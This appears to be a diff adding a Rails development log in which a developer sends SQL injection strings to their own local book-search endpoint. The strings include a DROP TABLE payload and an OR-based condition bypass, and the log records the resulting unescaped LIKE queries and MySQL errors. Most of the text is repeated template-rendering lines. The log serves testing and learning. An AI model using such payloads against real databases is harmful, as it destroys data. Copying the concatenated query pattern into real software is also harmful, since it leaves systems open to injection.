+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (60.2ms)
+Started GET "/books/search?keyword=%27%3BDROP+TABLE+books%3B%27SELECT++" for 127.0.0.1 at 2017-09-30 17:42:42 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"';DROP TABLE books;'SELECT  "}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%';DROP TABLE books;'SELECT  %'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books;'SELECT  %'' at line 1: SELECT * FROM books WHERE title LIKE '%';DROP TABLE books;'SELECT  %'):
+  
+app/controllers/books_controller.rb:11:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (3.0ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.2ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (60.0ms)
+Started GET "/books/search?keyword=%27%3BDROP+TABLE+books%3B+SELECT++" for 127.0.0.1 at 2017-09-30 17:43:04 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"';DROP TABLE books; SELECT  "}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%';DROP TABLE books; SELECT  %'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books; SELECT  %'' at line 1: SELECT * FROM books WHERE title LIKE '%';DROP TABLE books; SELECT  %'):
+  
+app/controllers/books_controller.rb:11:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (6.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.2ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (69.0ms)
+Started GET "/books/search?keyword=%27%3BDROP+TABLE+books%3B%27SELECT++%27" for 127.0.0.1 at 2017-09-30 17:43:58 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"';DROP TABLE books;'SELECT  '"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%';DROP TABLE books;'SELECT  '%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books;'SELECT  '%'' at line 1: SELECT * FROM books WHERE title LIKE '%';DROP TABLE books;'SELECT  '%'):
+  
+app/controllers/books_controller.rb:11:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (3.0ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (4184.0ms)
+Started GET "/books/search?keyword=%27" for 127.0.0.1 at 2017-09-30 17:44:46 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"'"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%'%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1: SELECT * FROM books WHERE title LIKE '%'%'):
+  
+app/controllers/books_controller.rb:11:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (3.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.7ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (67.5ms)
+Started GET "/books/search?keyword=%5C%27" for 127.0.0.1 at 2017-09-30 17:44:55 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"\\'"}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%\'%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.5ms)
+Completed 200 OK in 12ms (Views: 11.7ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search?keyword=%5C%27%3BSELECT+1+%3D+1" for 127.0.0.1 at 2017-09-30 17:45:19 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"\\';SELECT 1 = 1"}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%\';SELECT 1 = 1%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.5ms)
+Completed 200 OK in 13ms (Views: 11.8ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search?keyword=%5C%27%3BSELECT+%271+%3D+1" for 127.0.0.1 at 2017-09-30 17:45:30 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"\\';SELECT '1 = 1"}
+  [1m[36mBook Load (0.4ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%\';SELECT '1 = 1%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.4ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1 = 1%'' at line 1: SELECT * FROM books WHERE title LIKE '%\';SELECT '1 = 1%'):
+  
+app/controllers/books_controller.rb:11:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (4.3ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.5ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.6ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (67.7ms)
+Started GET "/books/search?keyword=%5C%27%3BSELECT+1+%3D+1" for 127.0.0.1 at 2017-09-30 17:45:42 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"\\';SELECT 1 = 1"}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%\';SELECT 1 = 1%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.5ms)
+Completed 200 OK in 17ms (Views: 16.3ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search?keyword=%5C%27%27%3BSELECT+%271+%3D+1" for 127.0.0.1 at 2017-09-30 17:45:46 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"\\'';SELECT '1 = 1"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%\'';SELECT '1 = 1%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT '1 = 1%'' at line 1: SELECT * FROM books WHERE title LIKE '%\'';SELECT '1 = 1%'):
+  
+app/controllers/books_controller.rb:11:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (6.4ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.4ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.8ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (66.6ms)
+Started GET "/books/search?keyword=%25%27%3BSELECT+%271+%3D+1" for 127.0.0.1 at 2017-09-30 17:48:06 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"%';SELECT '1 = 1"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%%';SELECT '1 = 1%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT '1 = 1%'' at line 1: SELECT * FROM books WHERE title LIKE '%%';SELECT '1 = 1%'):
+  
+app/controllers/books_controller.rb:11:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (3.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.3ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.6ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (1413.3ms)
+Started GET "/books/search?keyword=%25%27%3BSELECT+%271+%3D+1" for 127.0.0.1 at 2017-09-30 17:52:04 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"%';SELECT '1 = 1"}
+Completed 500 Internal Server Error in 8ms (ActiveRecord: 0.0ms)
+
+
+  
+NoMethodError (undefined method `find_by_sq' for #<Class:0x007fdfe35dd688>
+Did you mean?  find_by_sql
+               find_by
+               find_by!):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.8ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.3ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (63.6ms)
+Started GET "/books/search?keyword=%25%27%3BSELECT+%271+%3D+1" for 127.0.0.1 at 2017-09-30 17:52:27 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"%';SELECT '1 = 1"}
+Completed 500 Internal Server Error in 9ms (ActiveRecord: 0.0ms)
+
+
+  
+NoMethodError (undefined method `find_by_sq' for #<Class:0x007fdfea0d9a18>
+Did you mean?  find_by_sql
+               find_by
+               find_by!):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.4ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (0.9ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (59.6ms)
+Started GET "/books/search?keyword=%25%27%3BSELECT+%271+%3D+1" for 127.0.0.1 at 2017-09-30 17:53:20 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"%';SELECT '1 = 1"}
+Completed 500 Internal Server Error in 8ms (ActiveRecord: 0.0ms)
+
+
+  
+NoMethodError (undefined method `find_by_sq' for #<Class:0x007fdfe47d5f20>
+Did you mean?  find_by_sql
+               find_by
+               find_by!):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.0ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (0.9ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (64.2ms)
+Started GET "/books/search?keyword=%25%27%3BSELECT+%271+%3D+1" for 127.0.0.1 at 2017-09-30 17:53:30 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"%';SELECT '1 = 1"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%%';SELECT '1 = 1%'[0m
+Completed 500 Internal Server Error in 2ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT '1 = 1%'' at line 1: SELECT * FROM books WHERE title LIKE '%%';SELECT '1 = 1%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.4ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (62.8ms)
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%%';SELECT '1 = 1%'[0m
+Started GET "/books/search?keyword=%27+OR+%271%27+%3D+1" for 127.0.0.1 at 2017-09-30 17:56:17 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"' OR '1' = 1"}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%' OR '1' = 1%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.2ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1: SELECT * FROM books WHERE title LIKE '%' OR '1' = 1%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.9ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.4ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (65.5ms)
+Started GET "/books/search?keyword=%25%27%3BSELECT+%271%25%27+%3D+%271" for 127.0.0.1 at 2017-09-30 17:56:30 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"%';SELECT '1%' = '1"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%%';SELECT '1%' = '1%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT '1%' = '1%'' at line 1: SELECT * FROM books WHERE title LIKE '%%';SELECT '1%' = '1%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.6ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
